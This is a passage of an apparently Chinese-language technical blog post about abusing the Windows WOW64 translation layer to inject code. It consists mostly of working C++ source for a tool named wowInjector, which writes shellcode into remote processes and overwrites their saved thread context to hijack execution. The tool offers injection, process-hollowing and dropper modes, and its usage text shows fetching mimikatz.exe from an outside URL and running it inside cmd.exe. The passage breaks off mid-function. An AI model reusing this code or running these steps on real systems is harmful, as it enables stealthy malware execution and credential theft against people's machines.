WerShipAssertPtr;</span><br><span class="line">    T pContextData;</span><br><span class="line">    T pImageHeaderHash;</span><br><span class="line">    T TracingFlags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> _LDR_DATA_TABLE_ENTRY_T&lt;DWORD&gt; LDR_DATA_TABLE_ENTRY32;</span><br><span class="line"><span class="keyword">typedef</span> _LDR_DATA_TABLE_ENTRY_T&lt;DWORD64&gt; LDR_DATA_TABLE_ENTRY64;</span><br><span class="line"><span class="keyword">typedef</span> _TEB_T_&lt;DWORD&gt; TEB32;</span><br><span class="line"><span class="keyword">typedef</span> _TEB_T_&lt;DWORD64&gt; TEB64;</span><br><span class="line"><span class="keyword">typedef</span> _PEB_LDR_DATA_T&lt;DWORD&gt; PEB_LDR_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> _PEB_LDR_DATA_T&lt;DWORD64&gt; PEB_LDR_DATA64;</span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD, DWORD64, <span class="number">34</span>&gt; PEB32;</span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD64, DWORD, <span class="number">30</span>&gt; PEB64;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_XSAVE_FORMAT64</span>&#123;</span><br><span class="line">    WORD ControlWord;</span><br><span class="line">    WORD StatusWord;</span><br><span class="line">    BYTE TagWord;</span><br><span class="line">    BYTE Reserved1;</span><br><span class="line">    WORD ErrorOpcode;</span><br><span class="line">    DWORD ErrorOffset;</span><br><span class="line">    WORD ErrorSelector;</span><br><span class="line">    WORD Reserved2;</span><br><span class="line">    DWORD DataOffset;</span><br><span class="line">    WORD DataSelector;</span><br><span class="line">    WORD Reserved3;</span><br><span class="line">    DWORD MxCsr;</span><br><span class="line">    DWORD MxCsr_Mask;</span><br><span class="line">    _M128A FloatRegisters[<span class="number">8</span>];</span><br><span class="line">    _M128A XmmRegisters[<span class="number">16</span>];</span><br><span class="line">    BYTE Reserved4[<span class="number">96</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_CONTEXT64</span>&#123;</span><br><span class="line">    DWORD64 P1Home;</span><br><span class="line">    DWORD64 P2Home;</span><br><span class="line">    DWORD64 P3Home;</span><br><span class="line">    DWORD64 P4Home;</span><br><span class="line">    DWORD64 P5Home;</span><br><span class="line">    DWORD64 P6Home;</span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line">    DWORD MxCsr;</span><br><span class="line">    WORD SegCs;</span><br><span class="line">    WORD SegDs;</span><br><span class="line">    WORD SegEs;</span><br><span class="line">    WORD SegFs;</span><br><span class="line">    WORD SegGs;</span><br><span class="line">    WORD SegSs;</span><br><span class="line">    DWORD EFlags;</span><br><span class="line">    DWORD64 Dr0;</span><br><span class="line">    DWORD64 Dr1;</span><br><span class="line">    DWORD64 Dr2;</span><br><span class="line">    DWORD64 Dr3;</span><br><span class="line">    DWORD64 Dr6;</span><br><span class="line">    DWORD64 Dr7;</span><br><span class="line">    DWORD64 Rax;</span><br><span class="line">    DWORD64 Rcx;</span><br><span class="line">    DWORD64 Rdx;</span><br><span class="line">    DWORD64 Rbx;</span><br><span class="line">    DWORD64 Rsp;</span><br><span class="line">    DWORD64 Rbp;</span><br><span class="line">    DWORD64 Rsi;</span><br><span class="line">    DWORD64 Rdi;</span><br><span class="line">    DWORD64 R8;</span><br><span class="line">    DWORD64 R9;</span><br><span class="line">    DWORD64 R10;</span><br><span class="line">    DWORD64 R11;</span><br><span class="line">    DWORD64 R12;</span><br><span class="line">    DWORD64 R13;</span><br><span class="line">    DWORD64 R14;</span><br><span class="line">    DWORD64 R15;</span><br><span class="line">    DWORD64 Rip;</span><br><span class="line">    _XSAVE_FORMAT64 FltSave;</span><br><span class="line">    _M128A Header[<span class="number">2</span>];</span><br><span class="line">    _M128A Legacy[<span class="number">8</span>];</span><br><span class="line">    _M128A Xmm0;</span><br><span class="line">    _M128A Xmm1;</span><br><span class="line">    _M128A Xmm2;</span><br><span class="line">    _M128A Xmm3;</span><br><span class="line">    _M128A Xmm4;</span><br><span class="line">    _M128A Xmm5;</span><br><span class="line">    _M128A Xmm6;</span><br><span class="line">    _M128A Xmm7;</span><br><span class="line">    _M128A Xmm8;</span><br><span class="line">    _M128A Xmm9;</span><br><span class="line">    _M128A Xmm10;</span><br><span class="line">    _M128A Xmm11;</span><br><span class="line">    _M128A Xmm12;</span><br><span class="line">    _M128A Xmm13;</span><br><span class="line">    _M128A Xmm14;</span><br><span class="line">    _M128A Xmm15;</span><br><span class="line">    _M128A VectorRegister[<span class="number">26</span>];</span><br><span class="line">    DWORD64 VectorControl;</span><br><span class="line">    DWORD64 DebugControl;</span><br><span class="line">    DWORD64 LastBranchToRip;</span><br><span class="line">    DWORD64 LastBranchFromRip;</span><br><span class="line">    DWORD64 LastExceptionToRip;</span><br><span class="line">    DWORD64 LastExceptionFromRip;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// Below defines for .ContextFlags field are taken from WinNT.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONTEXT_AMD64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT_AMD64 0x100000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT64_CONTROL (CONTEXT_AMD64 | 0x1L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT64_INTEGER (CONTEXT_AMD64 | 0x2L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT64_SEGMENTS (CONTEXT_AMD64 | 0x4L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT64_FLOATING_POINT  (CONTEXT_AMD64 | 0x8L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT64_DEBUG_REGISTERS (CONTEXT_AMD64 | 0x10L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT64_FULL (CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT64_ALL (CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTEXT64_XSTATE (CONTEXT_AMD64 | 0x20L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> WOW64EXT_EXPORTS</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SPEC dllexport</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SPEC dllimport</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span>&#123;</span><br><span class="line">    __declspec(SPEC)<span class="function">DWORD64 __cdecl <span class="title">X64Call</span><span class="params">(DWORD64 func, <span class="type">int</span> argC, ...)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">DWORD64 __cdecl <span class="title">GetModuleHandle64</span><span class="params">(<span class="type">wchar_t</span>* lpModuleName)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">DWORD64 __cdecl <span class="title">GetProcAddress64</span><span class="params">(DWORD64 hModule, <span class="type">char</span>* funcName)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">SIZE_T __cdecl <span class="title">VirtualQueryEx64</span><span class="params">(HANDLE hProcess, DWORD64 lpAddress, MEMORY_BASIC_INFORMATION64* lpBuffer, SIZE_T dwLength)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">DWORD64 __cdecl <span class="title">VirtualAllocEx64</span><span class="params">(HANDLE hProcess, DWORD64 lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">BOOL __cdecl <span class="title">VirtualFreeEx64</span><span class="params">(HANDLE hProcess, DWORD64 lpAddress, SIZE_T dwSize, DWORD dwFreeType)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">BOOL __cdecl <span class="title">VirtualProtectEx64</span><span class="params">(HANDLE hProcess, DWORD64 lpAddress, SIZE_T dwSize, DWORD flNewProtect, DWORD* lpflOldProtect)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">BOOL __cdecl <span class="title">ReadProcessMemory64</span><span class="params">(HANDLE hProcess, DWORD64 lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">BOOL __cdecl <span class="title">WriteProcessMemory64</span><span class="params">(HANDLE hProcess, DWORD64 lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">BOOL __cdecl <span class="title">GetThreadContext64</span><span class="params">(HANDLE hThread, _CONTEXT64* lpContext)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">BOOL __cdecl <span class="title">SetThreadContext64</span><span class="params">(HANDLE hThread, _CONTEXT64* lpContext)</span></span>;</span><br><span class="line">    __declspec(SPEC)<span class="function">VOID __cdecl <span class="title">SetLastErrorFromX64Call</span><span class="params">(DWORD64 status)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="天堂注入器"><a href="#天堂注入器" class="headerlink" title="天堂注入器"></a>天堂注入器</h3><p>每次进出WOW64层必须先备份当下32位运行状态，模拟盖茨系统中断，再接着从32位运行状态备份快照还原。如果能泄露任意WOW64进程该备份快照储存地址，并修改快照中32位执行绪返回地址，就可控制该32位程式离开WOW64翻译层后要执行去哪里。原理参考WOW64模拟机初始化函数<code>RunSimulatedCode</code>函数入口程式码。</p>
<p>无论TEB32&#x2F;64或PEB32&#x2F;64其实再系统记忆分配上是申请一大块记忆体，才接着将其拆解为上述四块资料结构。Windows内核在生成任何用户模式新进程时，用<code>nt!MiCreatePebOrTeb</code>来替新进程创建TEB与PEB结构使用的记忆体，原生和WOW64进程皆如此。正常情况下内核开一块2000h的记忆体足够了，WOW64进程需要开3000h，再拆为4块资料结构使用。在实际WOW64进程孵化阶段，系统先正确填好WOW64进程64位PEB结构，再接着将64位PEB结构咨询拷贝至32位PEB结构中。</p>
<p>也就是说，只要能泄露任何一块资料结构地址，便能得知其余三块所有地址。例如将Mimikatz注入32位CMD命令中断cmd.exe中执行：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">getShadowContext32</span><span class="params">(HANDLE hProcess, <span class="type">uint32_t</span> PEB)</span> </span>&#123; <span class="comment">//通过任何一块已知资料结构来泄露其余三块资料结构 传入WOW64进程当前已知的PEB32地址</span></span><br><span class="line">    <span class="type">uint32_t</span> teb32 = PEB + <span class="number">0x3000</span>, teb64 = teb32 - <span class="number">0x2000</span>, ptrCtx = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(hProcess, (LPCVOID)(teb64 + <span class="number">0x1488</span>), &amp;ptrCtx, <span class="built_in">sizeof</span>(ptrCtx), <span class="number">0</span>); <span class="comment">//取出当前WOW64进程32位执行绪快取结构上下文地址</span></span><br><span class="line">    <span class="keyword">return</span> ptrCtx + <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hollowing</span><span class="params">(<span class="type">const</span> PWSTR path, <span class="type">const</span> BYTE* shellcode, DWORD shellcodeSize)</span> </span>&#123; <span class="comment">//劫持快取</span></span><br><span class="line">    <span class="type">wchar_t</span> pathRes[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION PI = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    STARTUPINFOW SI = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CONTEXT CTX = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(pathRes, path, <span class="built_in">sizeof</span>(pathRes));</span><br><span class="line">    <span class="built_in">CreateProcessW</span>(pathRes, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, BELOW_NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;SI, &amp;PI);</span><br><span class="line">    <span class="type">size_t</span> shellcodeAddr = (<span class="type">size_t</span>)<span class="built_in">VirtualAllocEx</span>(PI.hProcess, <span class="number">0</span>, shellcodeSize, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(PI.hProcess, (<span class="type">void</span>*)shellcodeAddr, shellcode, shellcodeSize, <span class="number">0</span>);</span><br><span class="line">    CTX.ContextFlags = CONTEXT_FULL;</span><br><span class="line">    <span class="built_in">GetThreadContext</span>(PI.hThread, (&amp;CTX));</span><br><span class="line">    <span class="type">uint32_t</span> remoteContext = <span class="built_in">getShadowContext32</span>(PI.hProcess, CTX.Ebx);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(PI.hProcess, <span class="built_in">LPVOID</span>(remoteContext + <span class="built_in">offsetof</span>(CONTEXT, Eip)), <span class="built_in">LPVOID</span>(&amp;shellcodeAddr), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(PI.hProcess, INFINITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整源码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wowInjector.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;peb.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;shellcodify.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;http_download.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">readBinFile</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span> fileName[], <span class="type">char</span>** bufPtr, DWORD&amp; length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (FILE* fp = _wfopen(fileName, <span class="string">L&quot;rb&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">        length = <span class="built_in">ftell</span>(fp);</span><br><span class="line">        *bufPtr = <span class="keyword">new</span> <span class="type">char</span>[length + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">        <span class="built_in">fread</span>(*bufPtr, <span class="built_in">sizeof</span>(<span class="type">char</span>), length, fp);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">getShadowContext32</span><span class="params">(HANDLE hProcess, <span class="type">uint32_t</span> PEB)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> teb32 = PEB + <span class="number">0x3000</span>, teb64 = teb32 - <span class="number">0x2000</span>, ptrCtx = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(hProcess, (LPCVOID)(teb64 + <span class="number">0x1488</span>), &amp;ptrCtx, <span class="built_in">sizeof</span>(ptrCtx), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ptrCtx + <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hollowing</span><span class="params">(<span class="type">const</span> PWSTR path, <span class="type">const</span> BYTE* shellcode, DWORD shellcodeSize)</span> </span>&#123;</span><br><span class="line">    <span class="type">wchar_t</span> pathRes[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION PI = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    STARTUPINFOW SI = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CONTEXT CTX = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(pathRes, path, <span class="built_in">sizeof</span>(pathRes));</span><br><span class="line">    <span class="built_in">CreateProcessW</span>(pathRes, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, BELOW_NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;SI, &amp;PI);</span><br><span class="line">    <span class="type">size_t</span> shellcodeAddr = (<span class="type">size_t</span>)<span class="built_in">VirtualAllocEx</span>(PI.hProcess, <span class="number">0</span>, shellcodeSize, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(PI.hProcess, (<span class="type">void</span>*)shellcodeAddr, shellcode, shellcodeSize, <span class="number">0</span>);</span><br><span class="line">    CTX.ContextFlags = CONTEXT_FULL;</span><br><span class="line">    <span class="built_in">GetThreadContext</span>(PI.hThread, (&amp;CTX));</span><br><span class="line">    <span class="type">uint32_t</span> remoteContext = <span class="built_in">getShadowContext32</span>(PI.hProcess, CTX.Ebx);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(PI.hProcess, <span class="built_in">LPVOID</span>(remoteContext + <span class="built_in">offsetof</span>(CONTEXT, Eip)), <span class="built_in">LPVOID</span>(&amp;shellcodeAddr), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(PI.hProcess, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inject</span><span class="params">(WORD pid, <span class="type">const</span> BYTE* shellcode, DWORD shellcodeSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> hProc = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, TRUE, pid);</span><br><span class="line">    <span class="type">size_t</span> shellcodeAddr = (<span class="type">size_t</span>)<span class="built_in">VirtualAllocEx</span>(hProc, <span class="number">0</span>, shellcodeSize, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProc, (<span class="type">void</span>*)shellcodeAddr, shellcode, shellcodeSize, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] shellcode current at %x\n&quot;</span>, shellcodeAddr);</span><br><span class="line">    <span class="keyword">auto</span> peb = (PROCESS_BASIC_INFORMATION*)<span class="built_in">QueryProcessInformation</span>(hProc, <span class="number">0</span>, <span class="built_in">sizeof</span>(PROCESS_BASIC_INFORMATION));</span><br><span class="line">    <span class="keyword">auto</span> k = <span class="built_in">getShadowContext32</span>(hProc, (<span class="type">uint32_t</span>)peb-&gt;PebBaseAddress) + <span class="built_in">offsetof</span>(CONTEXT, Eip);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProc, <span class="built_in">LPVOID</span>(k), <span class="built_in">LPVOID</span>(&amp;shellcodeAddr), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;WOW64 Injector - Abusing WOW64 Layer to Inject, by aaaddress1@chroot.org\n&quot;</span>);</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;usage: ./wowInjector [option] [payload] [destination]\n&quot;</span>);</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;  -- \n&quot;</span>);</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;  ex#1 ./wowInjector injection  C:/msgbox.exe [PID]\n&quot;</span>);</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;  ex#2 ./wowInjector hollowing  C:/msgbox.exe C:/Windows/SysWOW64/notepad.exe\n&quot;</span>);</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;  ex#3 ./wowInjector dropper    http://30cm.tw/mimikatz.exe C:/Windows/SySWOW64/cmd.exe\n&quot;</span>);</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">bool</span> mode_Dropper = !<span class="built_in">wcsicmp</span>(argv[<span class="number">1</span>], <span class="string">L&quot;dropper&quot;</span>), mode_Inject = !<span class="built_in">wcsicmp</span>(argv[<span class="number">1</span>], <span class="string">L&quot;injection&quot;</span>),mode_Hollowing = !<span class="built_in">wcsicmp</span>(argv[<span class="number">1</span>], <span class="string">L&quot;hollowing&quot;</span>);</span><br><span class="line">    <span class="function">PCHAR <span class="title">ptrToExe</span><span class="params">(<span class="number">0</span>)</span>, <span class="title">ptrToShc</span><span class="params">(<span class="number">0</span>)</span></span>; DWORD lenExe, lenShc;</span><br><span class="line">    <span class="keyword">if</span> (mode_Inject || mode_Hollowing) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[?] read payload from %s\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">readBinFile</span>(argv[<span class="number">2</span>], &amp;ptrToExe, lenExe))</span><br><span class="line">            <span class="built_in">wprintf</span>(<span class="string">L&quot;[v] read sourece exe file ok.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">wprintf</span>(<span class="string">L&quot;[x] fail to read source exe file.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mode_Dropper) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[?] download payload from %s\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">auto</span> binPayload = <span class="built_in">httpRecv</span>(argv[<span class="number">2</span>]);</span><br><span class="line">        lenExe = binPayload-&gt;<span class="built_in">size</span>();</span><br><span class="line">        ptrToExe = &amp;(*binPayload)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[x] fail to fetch payload?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ptrToShc = <span class="built_in">shellcodify</span>(ptrToExe, lenExe, lenShc))</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[v] prepare payload shellcode okay.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[x] fail to transform exe to shellcode.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mode_Inject) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[!] enter inject mode...\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> pid; <span class="built_in">swscanf</span>(argv[<span class="number">3</span>], <span class="string">L&quot;%i&quot;</span>, &amp;pid);</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[$] process injection [pid = %i]\n&quot;</span>, pid);</span><br><span class="line">        <span class="built_in">inject</span>(pid, (PBYTE)ptrToShc, lenShc);</span><br><span class="line">    